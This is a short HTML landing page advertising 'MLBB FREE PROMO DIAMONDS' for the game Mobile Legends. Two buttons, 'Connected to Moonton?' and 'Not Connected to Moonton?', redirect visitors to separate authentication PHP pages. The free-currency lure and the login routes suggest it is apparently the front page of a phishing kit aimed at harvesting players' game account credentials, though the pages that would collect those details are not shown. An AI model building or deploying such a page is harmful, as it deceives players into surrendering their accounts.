<!DOCTYPE HTML>
<html lang="en">
  
  <head>
   <meta charset="utf-8" >
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <link rel="stylesheet" href="style.css">
   <title>MLBB FREE PROMO DIAMONDS</title>
    </head>
    
    <body>
      <div id="main">
      <img id="promo" src="promo.png">
      
      <div id="btn">
        <input id="btn1" type="submit" value="Connected to Moonton?"><br><br>
        <input id="btn2" type="submit" value="Not Connected to Moonton?">
      </div>
      </div>
      
      <script>
      var btn1 = document.getElementById("btn1");
      var btn2 = document.getElementById("btn2");
      
      btn1.onclick = function(){
        window.location.href="authentication1.php";
      }
      btn2.onclick = function(){
        window.location.href="authentication2.php"
      }
      </script>
      </body>
      
</html>